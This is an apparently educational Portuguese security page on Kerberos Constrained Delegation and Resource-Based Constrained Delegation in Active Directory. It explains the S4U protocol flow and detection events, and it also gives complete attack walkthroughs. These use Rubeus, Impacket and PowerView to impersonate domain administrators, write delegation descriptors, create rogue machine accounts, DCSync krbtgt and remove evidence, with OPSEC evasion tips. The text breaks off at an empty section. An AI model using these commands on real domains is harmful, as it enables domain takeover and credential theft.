---
layout: cyber
section: active-directory
title: "Constrained Delegation e Resource-Based Constrained Delegation (RBCD)"
---

# Constrained Delegation e Resource-Based Constrained Delegation (RBCD)

# O que é?

Constrained Delegation e Resource-Based Constrained Delegation são as duas gerações subsequentes ao mecanismo original de Unconstrained Delegation do Windows 2000. Ambas resolvem o mesmo problema — permitir que serviços intermediários impersonem usuários para acessar outros serviços — mas com controles progressivamente mais granulares sobre quem pode delegar para quê.

**Constrained Delegation (KCD — Kerberos Constrained Delegation):**
Introduzida no **Windows Server 2003**, a Constrained Delegation limita o escopo da delegação: em vez de permitir que o serviço impersone o usuário para qualquer serviço da rede, define-se uma **lista explícita de SPNs** para os quais a delegação é permitida. Essa lista fica no atributo `msDS-AllowedToDelegateTo` da conta que delega.

```
msDS-AllowedToDelegateTo:
  cifs/DC01.domain.com
  http/SQLSRV01.domain.com
  host/FILESRV01.domain.com
```

Com essa lista, o serviço intermediário pode impersonar usuários **apenas** para esses SPNs específicos — não para qualquer serviço.

**Flag crítico para Protocol Transition:**
Além do atributo msDS-AllowedToDelegateTo, existe a flag `TRUSTED_TO_AUTH_FOR_DELEGATION` (UAC bit 0x1000000 = 16777216) que habilita **Protocol Transition** via S4U2Self. Com Protocol Transition, o serviço pode impersonar **qualquer usuário** — mesmo que esse usuário não tenha se autenticado via Kerberos — e então fazer delegação restrita para os SPNs listados. Este modo é o mais perigoso do KCD.

**Resource-Based Constrained Delegation (RBCD):**
Introduzida no **Windows Server 2012**, a RBCD inverte completamente a lógica de configuração. Em vez de configurar a delegação **na conta que delega** (fonte), a configuração fica **na conta que recebe** (recurso/destino). O atributo relevante é `msDS-AllowedToActOnBehalfOfOtherIdentity` — um Security Descriptor binário no objeto do recurso que lista quais contas têm permissão de delegar para ele.

**Protocolo subjacente — extensões S4U:**
Tanto KCD quanto RBCD implementam as extensões S4U (Service for User) da Microsoft ao protocolo Kerberos, definidas no documento [MS-SFU]:

```
S4U2Self (Service for User to Self):
  Permite que um serviço solicite TGS para SI MESMO em nome de qualquer usuário
  sem ter as credenciais desse usuário
  → Resultado: TGS forwardable (se TrustedToAuthForDelegation está habilitado)

S4U2Proxy (Service for User to Proxy):
  Permite que um serviço use um TGS forwardable para solicitar TGS
  para outro serviço em nome do usuário original
  → Resultado: TGS final para o serviço destino, como o usuário original
```

**A diferença chave entre KCD e RBCD:**

```
KCD Clássico (Windows 2003):
  [Conta que delega]
    → Configuração: msDS-AllowedToDelegateTo = {lista de SPNs destino}
    → Quem controla: Domain Admin configura a conta fonte
    → Problema: admin precisava ter visibilidade de todos os destinos necessários

RBCD (Windows 2012):
  [Recurso/serviço destino]
    → Configuração: msDS-AllowedToActOnBehalfOfOtherIdentity = {Security Descriptor}
    → Quem controla: admin do recurso decide quem pode delegar para ele
    → Vantagem: delegação gerenciada pelo dono do recurso, não pelo administrador central
```

**Por que RBCD existe:**
Em grandes organizações, o modelo KCD criava dependência do administrador central do AD para toda configuração de delegação. RBCD permite que times de aplicação gerenciem suas próprias delegações: o dono do servidor SQL pode definir quais servidores web têm permissão de delegar para ele, sem precisar de Domain Admin. Isso é alinhado com modelos de governança modernos (Azure AD, Kubernetes) onde delegação é configurada no recurso.

# Onde é implementado?

**Constrained Delegation (KCD) — cenários de uso:**

KCD é encontrado em organizações com aplicações enterprise implantadas entre 2003 e 2012, onde o padrão era configurar delegação restrita no serviço intermediário:

```
Cenário 1: SharePoint acessando SQL Server
  [Usuário] → [SharePoint Server (KCD para SQL SPNs)] → [SQL Server]
  msDS-AllowedToDelegateTo do SharePoint:
    MSSQLSvc/SQLSRV01.domain.com:1433
    MSSQLSvc/SQLSRV01.domain.com

Cenário 2: Servidor de BI (Business Intelligence) / Reporting Services
  [Analista] → [SSRS Server (KCD para Analysis Services)] → [SSAS/OLAP Server]
  Requer delegação para que relatórios mostrem dados no contexto do usuário

Cenário 3: Exchange Server acessando Active Directory
  [Exchange] tem KCD para LDAP/DC01 e CIFS/DC01
  Permite que Exchange acesse AD em nome de usuários para autodiscover, etc.

Cenário 4: SAP com autenticação integrada Windows
  [SAP Application Server] → [SAP HANA Database]
  Delegação restrita para o SPN do HANA (HDB/servidor)
```

**RBCD — cenários de uso:**

RBCD está sendo adotado em ambientes modernos, especialmente onde:

```
Cenário 1: Azure AD Application Proxy com KCD
  O Azure AD App Proxy Connector usa RBCD para fazer Kerberos Constrained Delegation
  (KCD via RBCD) e permitir SSO para aplicações on-premises publicadas no Azure AD
  O conector não precisa de permissões de Domain Admin para configurar delegação

Cenário 2: Kubernetes com Windows authentication
  Pods que precisam acessar recursos Windows autenticados usam RBCD
  A configuração fica no recurso destino, não no service account do Kubernetes

Cenário 3: Ambientes com times de aplicação autônomos
  Time de banco de dados gerencia quais servidores podem delegar para seus servidores SQL
  msDS-AllowedToActOnBehalfOfOtherIdentity é configurado no SQL Server pelo DBA
  sem necessidade de Domain Admin para cada mudança

Cenário 4: Migração de UD para delegação mais segura
  Organizações migrando de Unconstrained Delegation usam RBCD como destino mais seguro
  Mantém funcionalidade multi-tier sem o risco de UD
```

**Conta de serviço vs. machine account:**
KCD pode ser configurado tanto em contas de usuário (service accounts com SPN) quanto em machine accounts (contas de computador). RBCD é configurado sempre no objeto que recebe a delegação — tipicamente machine accounts, mas também pode ser em contas de serviço com SPN.

**Presença em auditorias:**
Em qualquer pentest/red team de ambiente Windows enterprise, KCD e RBCD são verificados porque:
- KCD com Protocol Transition (TrustedToAuthForDelegation) é equivalente a ter uma conta que pode impersonar qualquer usuário sem precisar da senha
- RBCD pode ser configurado por qualquer conta com GenericWrite sobre machine accounts — e GenericWrite é frequentemente concedido a grupos de helpdesk/administradores de servidor por conveniência

# Como funciona de forma adequada?

O mecanismo central de KCD e RBCD é o par de extensões S4U (S4U2Self + S4U2Proxy). Entender o fluxo legítimo é essencial para entender o abuso.

**Fluxo S4U2Self — obtendo TGS para si mesmo em nome de um usuário:**

```
[Serviço A tem TrustedToAuthForDelegation e precisa acessar Serviço B como Usuário X]

Passo 1: Serviço A solicita TGS para si mesmo em nome de X (S4U2Self)
┌──────────┐  S4U2Self-REQ                              ┌─────┐
│ Serviço A│  → KDC, preciso de TGS para               │ KDC │
│          │    HOST/serviceA em nome de X              │     │
└──────────┘                                            └─────┘

Passo 2: KDC verifica se Serviço A tem TrustedToAuthForDelegation
         SE SIM:
           → KDC emite TGS(X → HOST/serviceA) com flag FORWARDABLE
         SE NÃO:
           → KDC emite TGS(X → HOST/serviceA) SEM flag FORWARDABLE
             (sem forwardable, não pode ser usado em S4U2Proxy)

┌──────────┐  S4U2Self-REP (TGS forwardable)            ┌─────┐
│ Serviço A│ ◄─────────────────────────────────────────  │ KDC │
└──────────┘                                            └─────┘
```

**Fluxo S4U2Proxy — usando o TGS forwardable para acessar serviço destino:**

```
Passo 3: Serviço A usa TGS forwardable em S4U2Proxy
┌──────────┐  S4U2Proxy-REQ                             ┌─────┐
│ Serviço A│  → KDC, tenho TGS forwardable de X,        │ KDC │
│          │    preciso de TGS para CIFS/Serviço-B       │     │
└──────────┘    em nome de X                            └─────┘

Passo 4: KDC verifica (para KCD):
           CIFS/Serviço-B está em msDS-AllowedToDelegateTo de Serviço A?
         KDC verifica (para RBCD):
           Serviço A está em msDS-AllowedToActOnBehalfOfOtherIdentity de Serviço B?

         SE SIM (em qualquer dos dois):
           → KDC emite TGS(X → CIFS/Serviço-B)

┌──────────┐  S4U2Proxy-REP (TGS para Serviço B como X) ┌─────┐
│ Serviço A│ ◄─────────────────────────────────────────  │ KDC │
└──────────┘                                            └─────┘

Passo 5: Serviço A usa o TGS para acessar Serviço B como usuário X
┌──────────┐  AP-REQ (TGS de X para CIFS/Serviço-B)    ┌──────────┐
│ Serviço A│ ───────────────────────────────────────►   │ Serviço B│
│          │ ◄───────────────────────────────────────   │          │
└──────────┘  Acesso como usuário X                     └──────────┘
```

**Por que Protocol Transition existe:**
Existe um caso onde o usuário não se autentica via Kerberos ao Serviço A — pode usar NTLM, formulário web, certificado, etc. Sem um TGS Kerberos inicial do usuário, como o Serviço A faria S4U2Proxy? S4U2Self resolve isso: o serviço gera um TGS sintético para si mesmo em nome de qualquer usuário e o usa como entrada para S4U2Proxy. Isso é o Protocol Transition.

**Configuração correta de RBCD:**

```powershell
# Exemplo: WebSrv01 precisa acessar SQL01 em nome dos usuários
# Administrador do SQL01 configura RBCD: WebSrv01 pode delegar para SQL01

# Passo 1: Obter SID de WebSrv01
$webSrvSID = (Get-ADComputer -Identity "WebSrv01").SID

# Passo 2: Configurar RBCD em SQL01 (via módulo AD — mais simples)
Set-ADComputer -Identity "SQL01" `
    -PrincipalsAllowedToDelegateToAccount (Get-ADComputer "WebSrv01")

# Verificação:
(Get-ADComputer "SQL01" -Properties PrincipalsAllowedToDelegateToAccount).PrincipalsAllowedToDelegateToAccount

# Resultado: CN=WebSrv01,CN=Computers,DC=domain,DC=com

# Passo 3 (PowerView — método alternativo para ver o security descriptor bruto):
$rawSD = (Get-DomainComputer SQL01 -Properties 'msds-allowedtoactonbehalfofotheridentity').'msds-allowedtoactonbehalfofotheridentity'
$SD = New-Object Security.AccessControl.RawSecurityDescriptor($rawSD, 0)
$SD.DiscretionaryAcl
# SecurityIdentifier: S-1-5-21-...-XXXXX (SID de WebSrv01)
```

**Diferenças chave entre KCD e RBCD na prática:**

```
Aspecto                     KCD Clássico                RBCD
──────────────────────────────────────────────────────────────────
Onde configurar:            Na conta SOURCE (que delega)   Na conta DESTINO (recurso)
Atributo:                   msDS-AllowedToDelegateTo    msDS-AllowedToActOnBehalfOfOtherIdentity
Quem pode configurar:       Domain Admin (geralmente)   Qualquer um com Write no objeto destino
Protocol Transition:        Requer flag especial        Sempre disponível
Raio de delegação:          Lista de SPNs no source      Qualquer serviço no destino
Auditoria:                  Mais direta                  Mais difícil de perceber
Uso moderno:                Legado mas prevalente       Preferido para novos deployments
```

**Limitações de segurança legítimas:**
- Usuários protegidos (membros de Protected Users group) não podem ser delegados — seus tickets não são forwardable mesmo com KCD/RBCD configurados
- A flag "Account is sensitive and cannot be delegated" no objeto de usuário bloqueia delegação mesmo quando KCD/RBCD estão configurados
- Kerberos armoring (FAST) em ambientes com DCs modernos adiciona proteção adicional

---

## KCD, RBCD e S4U: As Variantes

### Constrained Delegation Clássica (KCD)

KCD foi introduzida no Windows Server 2003 como alternativa mais segura ao Unconstrained Delegation. Em vez de permitir delegação para qualquer serviço, CD restringe a delegação a uma lista específica de SPNs definida no atributo `msDS-AllowedToDelegateTo` da conta que delega.

**Configuração no AD:**
- Atributo `msDS-AllowedToDelegateTo` contém lista de SPNs permitidos (ex: `cifs/DC01.domain.com`)
- Flag `TRUSTED_TO_AUTH_FOR_DELEGATION` no `userAccountControl` (bit 0x1000000 = 16777216)
- Flag `TRUSTED_FOR_DELEGATION` NÃO é necessária para CD (só para UD)

**Dois modos de Constrained Delegation:**

1. **Com Protocol Transition (T2A4D — TrustedToAuthForDelegation):**
   - Permite S4U2Self + S4U2Proxy
   - A service account pode obter TGS para si mesma em nome de QUALQUER usuário, sem credenciais desse usuário
   - Depois usa esse TGS para obter TGS para os serviços permitidos em `msDS-AllowedToDelegateTo`
   - Flag: `TRUSTED_TO_AUTH_FOR_DELEGATION` presente
   - Muito mais perigoso: permite impersonar qualquer usuário (inclusive administradores)

2. **Sem Protocol Transition:**
   - Apenas S4U2Proxy
   - Requer que o usuário se autentique primeiro via Kerberos (com TGS forwardable)
   - Mais restrito: não pode impersonar usuários arbitrários

### Extensões S4U em Detalhe

As extensões S4U (Service for User) são extensões Microsoft ao protocolo Kerberos, definidas em [MS-SFU].

#### S4U2Self (Service for User to Self)

**O que faz**: Permite que um serviço (Service A) solicite ao KDC um TGS para si mesmo em nome de qualquer usuário, sem as credenciais desse usuário.

**Requisito**: A conta de serviço deve ter a flag `TRUSTED_TO_AUTH_FOR_DELEGATION` (TrustedToAuthForDelegation).

**Fluxo:**
```
Service A → KDC: "Preciso de um TGS para mim mesmo (HOST/serviceA) em nome do usuário 'Administrator'"
KDC verifica: serviceA tem TrustedToAuthForDelegation?
    SIM → KDC emite TGS para HOST/serviceA como se o usuário 'Administrator' tivesse solicitado
    NÃO → Erro
KDC → Service A: TGS(Administrator → HOST/serviceA) [forwardable se TrustedToAuthForDelegation]
```

**Detalhe crítico**: O TGS produzido por S4U2Self só é `FORWARDABLE` se a conta tiver `TrustedToAuthForDelegation`. Sem esse flag, o ticket não é forwardable e não pode ser usado em S4U2Proxy.

#### S4U2Proxy (Service for User to Proxy)

**O que faz**: Permite que Service A use um TGS forwardable (obtido via S4U2Self ou de um usuário real) para solicitar TGS para Service B em nome do usuário original.

**Requisito**: 
- Service B deve estar na lista `msDS-AllowedToDelegateTo` de Service A
- O TGS apresentado deve ser `FORWARDABLE`

**Fluxo:**
```
Service A → KDC: "Tenho TGS forwardable do usuário X. Preciso de TGS para CIFS/DC01 em nome de X"
KDC verifica: CIFS/DC01 está em msDS-AllowedToDelegateTo de serviceA?
    SIM → KDC emite TGS(X → CIFS/DC01)
    NÃO → Erro
KDC → Service A: TGS(X → CIFS/DC01)
Service A usa TGS para acessar CIFS/DC01 como usuário X
```

### Resource-Based Constrained Delegation (RBCD)

RBCD foi introduzida no Windows Server 2012 e inverte a lógica do KCD clássico:

| Aspecto | KCD Clássico | RBCD |
|---|---|---|
| Onde é configurado | Na conta que delega (fonte) | Na conta que recebe (destino/recurso) |
| Atributo | `msDS-AllowedToDelegateTo` em A | `msDS-AllowedToActOnBehalfOfOtherIdentity` em B |
| Quem configura | Domain Admin (geralmente) | Qualquer um com WriteProperty/GenericWrite em B |
| Protocol Transition | Requer flag especial | Sempre disponível |
| Extensão Kerberos | MS-SFU S4U2Self + S4U2Proxy | Igual, mas verificação diferente |

**O atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`:**
- Contém um Security Descriptor binário
- O Security Descriptor lista as contas que podem delegar para o recurso
- Quando Account A está listada, A pode executar S4U2Self + S4U2Proxy para obter tickets como qualquer usuário para serviços no recurso B

**Por que RBCD é mais fácil de explorar:**
1. A permissão de configurar `msDS-AllowedToActOnBehalfOfOtherIdentity` é dada implicitamente quando um usuário tem `GenericWrite`, `GenericAll`, `WriteProperty`, ou `WriteDacl` sobre o objeto computador
2. Essas permissões são frequentemente concedidas erroneamente (ex: equipe de helpdesk com GenericWrite em OUs de computadores)
3. MachineAccountQuota permite criar machine accounts — que têm SPNs automáticos — eliminando a necessidade de encontrar account com SPN existente

---

## Na Prática

### Identificar Alvos com Constrained Delegation

**PowerView:**
```powershell
# Contas de usuário com Constrained Delegation (TrustedToAuth)
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Computadores com Constrained Delegation
Get-DomainComputer -TrustedToAuth | Select-Object dnshostname, msds-allowedtodelegateto

# Output esperado:
# samaccountname : svcWebApp
# msds-allowedtodelegateto : {cifs/DC01.domain.com, host/DC01.domain.com}

# Verificar se tem Protocol Transition (TrustedToAuthForDelegation flag)
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, useraccountcontrol, msds-allowedtodelegateto |
    ForEach-Object {
        $uac = $_.useraccountcontrol
        $hasT2A4D = ($uac -band 16777216) -ne 0  # TRUSTED_TO_AUTH_FOR_DELEGATION
        [PSCustomObject]@{
            Name = $_.samaccountname
            ProtocolTransition = $hasT2A4D
            AllowedTo = $_.msds-allowedtodelegateto
        }
    }
```

**Active Directory Module:**
```powershell
Import-Module ActiveDirectory

# Usuários com CD
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} `
    -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo |
    Select-Object SamAccountName, msDS-AllowedToDelegateTo

# Computadores com CD
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} `
    -Properties TrustedToAuthForDelegation, msDS-AllowedToDelegateTo |
    Select-Object Name, msDS-AllowedToDelegateTo
```

**LDAP filter para CD com Protocol Transition:**
```
# Bit 16777216 (0x1000000) = TRUSTED_TO_AUTH_FOR_DELEGATION
(userAccountControl:1.2.840.113556.1.4.803:=16777216)

# ldapsearch:
ldapsearch -x -H ldap://DC_IP -D "domain\user" -w "password" \
  -b "DC=domain,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=16777216)" \
  dn msDS-AllowedToDelegateTo userAccountControl
```

**BloodHound (CD aparece como propriedade de nó):**
```cypher
-- Usuários com Constrained Delegation
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate

-- Computadores com CD
MATCH (c:Computer) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate

-- CD que inclui acesso ao DC (CIFS/DC ou HOST/DC)
MATCH (n) WHERE ANY(x IN n.allowedtodelegate WHERE x CONTAINS 'DC') 
RETURN n.name, n.allowedtodelegate
```

### Identificar Alvos com RBCD Configurado

```powershell
# PowerView — verificar msds-allowedtoactonbehalfofotheridentity
Get-DomainComputer TARGET | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity

# Se tiver valor, decodificar o security descriptor:
$rawSD = (Get-DomainComputer TARGET -Properties msds-allowedtoactonbehalfofotheridentity).'msds-allowedtoactonbehalfofotheridentity'
$SD = New-Object Security.AccessControl.RawSecurityDescriptor($rawSD, 0)
$SD.DiscretionaryAcl  # Mostra quem pode delegar

# Active Directory Module:
(Get-ADComputer TARGET -Properties PrincipalsAllowedToDelegateToAccount).PrincipalsAllowedToDelegateToAccount
```

### Identificar Alvos Vulneráveis para Configurar RBCD (Pré-ataque)

```powershell
# Quem tem GenericWrite/GenericAll sobre computadores?
# (permite configurar RBCD no computador alvo)
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty|WriteDacl" -and
    $_.ObjectAceType -match "00000000-0000-0000-0000-000000000000|ms-DS-Allowed-To-Act-On-Behalf-Of-Other-Identity" -and
    $_.SecurityIdentifier -notmatch '^S-1-5-21.*-51[2-9]$'  # Excluir grupos de admin padrão
} | Select-Object ObjectDN, ActiveDirectoryRights, SecurityIdentifier

# BloodHound — encontrar usuários com GenericWrite em computadores
MATCH p=(u:User)-[:GenericWrite]->(c:Computer)
RETURN u.name, c.name

# Encontrar máquinas onde seu usuário comprometido tem write
MATCH p=(u:User {name:"COMPROMISED_USER@DOMAIN.COM"})-[r:GenericWrite|GenericAll|WriteOwner|WriteDacl]->(c:Computer)
RETURN p
```

---

## Exemplos de Código / Comandos

### Exploração de Constrained Delegation com Rubeus

**Cenário**: `svcWebApp` tem Protocol Transition e pode delegar para `cifs/DC01.domain.com`. Você obteve o hash NTLM ou senha de `svcWebApp`.

```cmd
# PASSO 1: Obter TGT para svcWebApp
# Com hash NTLM (rc4):
Rubeus.exe asktgt /user:svcWebApp /rc4:NTLMHASH /domain:domain.com /nowrap

# Com senha em texto claro:
Rubeus.exe asktgt /user:svcWebApp /password:Password123 /domain:domain.com /nowrap

# Com AES256 (mais furtivo — usa cifra mais forte, detectores podem preferir rc4):
Rubeus.exe asktgt /user:svcWebApp /aes256:AES256HASH /domain:domain.com /opsec /nowrap

# Output: base64 do TGT, copiar para próximo passo

# PASSO 2: S4U2Self + S4U2Proxy em um único comando
Rubeus.exe s4u /ticket:BASE64_TGT \
    /impersonateuser:Administrator \
    /msdsspn:cifs/DC01.domain.com \
    /nowrap

# Para serviço alternativo (LDAP, HTTP, HOST):
Rubeus.exe s4u /ticket:BASE64_TGT \
    /impersonateuser:Administrator \
    /msdsspn:cifs/DC01.domain.com \
    /altservice:ldap \
    /nowrap

# PASSO 3: Injetar o TGS final
Rubeus.exe ptt /ticket:BASE64_TGS_FINAL

# PASSO 4: Usar o acesso
dir \\DC01.domain.com\c$
klist

# DCSync com Mimikatz após PTT:
mimikatz# lsadump::dcsync /domain:domain.com /user:krbtgt
```

**Nota sobre /altservice**: O KDC inclui o SPN no TGS, mas o cliente pode sobrescrever isso ao apresentar ao servidor. Muitos serviços verificam apenas o ticket e não o SPN — então é possível pedir `cifs/DC01` e usar como `ldap/DC01`. Isso permite DCSync mesmo quando o CD só lista `cifs`.

### altservice — Pivoting para Outros SPNs

Quando `/altservice` é especificado, Rubeus substitui o SPN no ticket → permite usar delegação configurada para um serviço e redirecionar para outro no mesmo host.

```bash
# Delegação configurada para MSSQLSvc/sql01 → usar para CIFS/sql01
.\Rubeus.exe s4u /user:appsvc \
    /rc4:NTLM_HASH \
    /impersonateuser:administrator \
    /msdsspn:"MSSQLSvc/sql01.corp.local:1433" \
    /altservice:cifs \
    /ptt

# Agora tem CIFS ticket → acesso ao filesystem
ls \\sql01.corp.local\c$
```

```bash
# Para acesso WinRM/PSRemoting (http SPN)
.\Rubeus.exe s4u /user:appsvc \
    /rc4:NTLM_HASH \
    /impersonateuser:administrator \
    /msdsspn:"MSSQLSvc/sql01.corp.local" \
    /altservice:http \
    /ptt

Enter-PSSession -ComputerName sql01.corp.local
```

SPNs úteis via altservice: `cifs` (file share), `ldap` (DCSync), `http` (WinRM), `host` (broad access).

### Exploração via Impacket (Linux)

```bash
# Passo 1: Obter TGT
impacket-getTGT domain.com/svcWebApp:Password123
# ou com hash:
impacket-getTGT -hashes :NTLMHASH domain.com/svcWebApp

export KRB5CCNAME=svcWebApp.ccache

# Passo 2: S4U completo (getST substitui getST.py em versões mais novas)
impacket-getST -spn cifs/DC01.domain.com \
    -impersonate Administrator \
    -dc-ip DC_IP \
    domain.com/svcWebApp:Password123

# Com hash:
impacket-getST -spn cifs/DC01.domain.com \
    -impersonate Administrator \
    -hashes :NTLMHASH \
    -dc-ip DC_IP \
    domain.com/svcWebApp

# Output: Administrator@cifs_DC01.ccache
export KRB5CCNAME=Administrator@cifs_DC01.domain.com@DC01.domain.com.ccache

# Passo 3: DCSync
impacket-secretsdump -k -no-pass domain.com/Administrator@DC01.domain.com

# Passo 4: Acesso SMB
impacket-smbclient -k -no-pass domain.com/Administrator@DC01.domain.com
```

### Exploração Completa de RBCD

#### Pré-requisitos checklist:
1. Usuário/computer account com `GenericWrite`/`GenericAll`/`WriteProperty` no computador alvo
2. Account com SPN (machine account ou usuário com SPN)
3. Se não tiver account com SPN: criar machine account (MachineAccountQuota)

#### Verificar MachineAccountQuota:

```powershell
# PowerView:
Get-DomainObject -Identity "DC=domain,DC=com" -Properties ms-DS-MachineAccountQuota

# AD Module:
Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | 
    Get-ADObject -Properties ms-DS-MachineAccountQuota

# LDAP:
ldapsearch -x -H ldap://DC_IP -D "domain\user" -w "password" \
    -b "DC=domain,DC=com" -s base "objectClass=*" ms-DS-MachineAccountQuota
```

#### Passo 1: Criar Machine Account (se necessário)

```bash
# Impacket addcomputer.py (Linux):
python3 /opt/impacket/examples/addcomputer.py \
    -computer-name 'ATTACKERPC$' \
    -computer-pass 'Attacker@123' \
    -dc-ip DC_IP \
    domain.com/lowprivuser:Password123

# Verificar criação:
Get-DomainComputer ATTACKERPC -Properties objectsid, samaccountname
```

```powershell
# PowerMad (Windows — mais flexível):
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount "ATTACKERPC" -Password (ConvertTo-SecureString "Attacker@123" -AsPlainText -Force)

# Verificar:
Get-MachineAccountAttribute -MachineAccount "ATTACKERPC" -Attribute objectsid
```

#### Passo 2: Configurar RBCD no Alvo

```powershell
# Método 1: PowerView + Manipulação direta do Security Descriptor
Import-Module .\PowerView.ps1

# Obter SID da machine account atacante
$attackerSid = (Get-DomainComputer ATTACKERPC -Properties objectsid).objectsid

# Criar Security Descriptor com ACE permitindo ATTACKERPC$ delegar para TARGET
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attackerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Configurar msDS-AllowedToActOnBehalfOfOtherIdentity no alvo
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}

# Verificar:
$rawSD = (Get-DomainComputer TARGET -Properties 'msds-allowedtoactonbehalfofotheridentity').'msds-allowedtoactonbehalfofotheridentity'
$newSD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $rawSD, 0
$newSD.DiscretionaryAcl
```

```powershell
# Método 2: AD Module (mais simples se disponível)
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount (Get-ADComputer ATTACKERPC)

# Verificar:
(Get-ADComputer TARGET -Properties PrincipalsAllowedToDelegateToAccount).PrincipalsAllowedToDelegateToAccount
```

```bash
# Método 3: rbcd.py do Impacket (Linux)
python3 /opt/impacket/examples/rbcd.py \
    -delegate-to TARGET$ \
    -delegate-from ATTACKERPC$ \
    -action write \
    -dc-ip DC_IP \
    domain.com/lowprivuser:Password123

# Verificar:
python3 rbcd.py \
    -delegate-to TARGET$ \
    -action read \
    -dc-ip DC_IP \
    domain.com/lowprivuser:Password123
```

#### Passo 3: Executar S4U como ATTACKERPC

```cmd
# Windows — Rubeus
# Calcular hash NTLM da senha da machine account criada
# "Attacker@123" -> NTLM: (usar rubeus hash ou pwdump)
Rubeus.exe hash /password:Attacker@123 /user:ATTACKERPC$ /domain:domain.com

# S4U2Self + S4U2Proxy para impersonar Administrator no alvo
Rubeus.exe s4u \
    /user:ATTACKERPC$ \
    /rc4:NTLM_HASH_OF_ATTACKERPC \
    /impersonateuser:Administrator \
    /msdsspn:cifs/TARGET.domain.com \
    /nowrap

# PTT e acesso:
Rubeus.exe ptt /ticket:BASE64_TGS
dir \\TARGET.domain.com\c$
```

```bash
# Linux — Impacket getST
impacket-getST \
    -spn cifs/TARGET.domain.com \
    -impersonate Administrator \
    -dc-ip DC_IP \
    'domain.com/ATTACKERPC$:Attacker@123'

export KRB5CCNAME=Administrator@cifs_TARGET.domain.com@TARGET.domain.com.ccache

# DCSync no alvo (se TARGET for DC) ou acesso remoto:
impacket-secretsdump -k -no-pass domain.com/Administrator@TARGET.domain.com
impacket-wmiexec -k -no-pass domain.com/Administrator@TARGET.domain.com
impacket-psexec -k -no-pass domain.com/Administrator@TARGET.domain.com
```

### RBCD Self-Abuse (Quando Você Compromete o Próprio Computador)

Se você tem SYSTEM em um host e esse host tem `GenericWrite` sobre si mesmo (acontece em alguns cenários de misconfiguration):

```powershell
# Criar machine account controlada
New-MachineAccount -MachineAccount "ATTACKER" -Password (ConvertTo-SecureString "Pass123" -AsPlainText -Force)

# Configurar RBCD: ATTACKER pode delegar para CURRENT_MACHINE
$attackerSid = (Get-DomainComputer ATTACKER -Properties objectsid).objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$attackerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Aplicar no próprio computador (requer write sobre si mesmo)
$computerDN = (Get-DomainComputer $env:COMPUTERNAME).distinguishedname
Set-DomainObject -Identity $computerDN -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes}

# S4U para impersonar admin local/domain no próprio host
Rubeus.exe s4u /user:ATTACKER$ /rc4:HASH /impersonateuser:Administrator /msdsspn:host/$env:COMPUTERNAME /ptt
```

### Limpeza Após RBCD

```powershell
# Remover RBCD configurado (não deixar evidências)
# PowerView:
Set-DomainObject -Identity TARGET -Clear msds-allowedtoactonbehalfofotheridentity

# AD Module:
Set-ADComputer -Identity TARGET -PrincipalsAllowedToDelegateToAccount $null

# Impacket:
python3 rbcd.py -delegate-to TARGET$ -action flush -dc-ip DC_IP domain.com/user:pass

# Remover machine account criada (se você tem permissão):
Remove-ADComputer -Identity "ATTACKERPC" -Confirm:$false

# Impacket:
python3 addcomputer.py -computer-name "ATTACKERPC$" -computer-pass "Attacker@123" \
    -dc-ip DC_IP -action delete domain.com/user:pass
```

---

## Detecção e OPSEC

### Indicadores de Comprometimento — Constrained Delegation

**Evento 4769 (TGS-REQ/TGS-REP):**
- S4U2Self gera requisição de TGS onde `Account Name` difere do usuário da sessão
- S4U2Proxy gera requisição de TGS com `Transited Services` presente
- Campo `Ticket Options` com valor `0x40810010` é típico de S4U2Proxy
- Monitorar: TGS requests originando de service accounts para serviços administrativos (CIFS/DC, LDAP/DC)

**Evento 4624 (Logon):**
- Logon Type 3 (Network) para serviços administrativos vindos de service accounts que normalmente não fazem isso

**Correlação de anomalias:**
- Service account que normalmente acessa APENAS `http/webserver` solicitando TGS para `cifs/DC01`
- Múltiplas requisições S4U em curto intervalo de tempo

### Indicadores de Comprometimento — RBCD

**Evento 5136 (Directory Service Changes):**
- Modificação do atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`
- Este evento é crítico: deve sempre alertar quando modificado fora de janela de manutenção
- Campo `Object DN` contém o computador alvo
- Campo `LDAP Display Name` = `msDS-AllowedToActOnBehalfOfOtherIdentity`

**Evento 4741 (Computer Account Created):**
- Criação de machine account fora de processo conhecido (especialmente se criada por usuário não-admin)
- Correlacionar com `5136` nos minutos seguintes — padrão claro de RBCD attack

**Monitorar MachineAccountQuota:**
- Contas comuns criando machine accounts é anomalia
- Baseline: quantas machine accounts são criadas por semana? Por quem?

### Técnicas de OPSEC

**Para CD Exploitation:**
```
1. Usar /aes256 no Rubeus em vez de /rc4 — usa cifra mais forte e parece mais legítimo
2. Especificar apenas o SPN necessário — evitar pedir múltiplos tickets
3. Limpar tickets após uso (klist purge)
4. Executar de host que já tenha comunicação legítima com o DC
5. Evitar /altservice desnecessário — campos suspeitos nos logs de TGS
```

**Para RBCD Exploitation:**
```
